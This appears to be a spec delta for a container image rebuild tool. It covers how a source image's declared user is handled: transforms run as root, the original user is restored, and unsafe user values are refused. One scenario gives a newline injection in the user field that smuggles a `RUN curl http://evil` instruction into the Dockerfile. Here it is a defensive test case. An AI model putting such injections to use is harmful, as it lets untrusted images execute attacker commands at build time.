# Spec Delta

## Purpose

How the rebuild path treats the execution identity the source image declares: transform steps run as root, the rebuilt image keeps the source's `User`, and a user value the untrusted source declares is never rendered unchecked.

## ADDED Requirements

### Requirement: A root-equivalent source renders exactly as before

When the source image's OCI config declares no user, or a root-equivalent user (`""`, `root`, `0`,
`0:0`, `root:root`), the rendered Dockerfile SHALL contain no `USER` instruction and SHALL be
byte-for-byte identical to the Dockerfile rendered before this change for the same transform list.
The transform version of an existing policy SHALL NOT change because of this capability.

#### Scenario: Existing hardened policy is unchanged

- **WHEN** a policy with `injectCA` and `rewritePackageSources` is rendered for a source whose config declares no user
- **THEN** the Dockerfile has no `USER` line, is identical to the pre-change rendering, and the next reconcile keeps every placed tag

#### Scenario: Explicit root is treated as root

- **WHEN** the source config declares `User: "0:0"`
- **THEN** the Dockerfile has no `USER` line

### Requirement: A non-root source is rebuilt as root and restored

When the source image's OCI config declares a non-root user that matches the safe pattern, the
rendered Dockerfile SHALL switch to `root` before the first transform instruction and SHALL restore
the source's user, verbatim, after the last one. The rebuilt image's config SHALL declare the same
user as the source.

#### Scenario: Named user restored

- **WHEN** the source config declares `User: "app"` and the policy lists `rewritePackageSources` and `upgradePackages`
- **THEN** the Dockerfile reads `USER root` before the transform instructions and `USER app` after them, and the rebuilt image declares user `app`

#### Scenario: Numeric uid:gid restored verbatim

- **WHEN** the source config declares `User: "1000:1000"`
- **THEN** the Dockerfile ends with `USER 1000:1000`

### Requirement: A user value outside the safe pattern is refused

The user value read from the source image SHALL be accepted only when it is a name or `uid[:gid]`
of 1 to 64 characters per part, drawn from letters, digits, `.`, `_` and `-`. Any other value SHALL
fail the operation as a domain error before any Dockerfile is rendered; the operation SHALL be
reported failed with the refused value named, nothing SHALL be built or pushed for that tag.

#### Scenario: Newline in the user value

- **WHEN** the source config declares `User: "app\nRUN curl http://evil"`
- **THEN** no Dockerfile is rendered, the operation is reported failed naming the refused value, and the destination tag is left as it was

#### Scenario: Space or overlong value

- **WHEN** the source config declares `User: "a b"` or a 65-character user name
- **THEN** the operation fails the same way
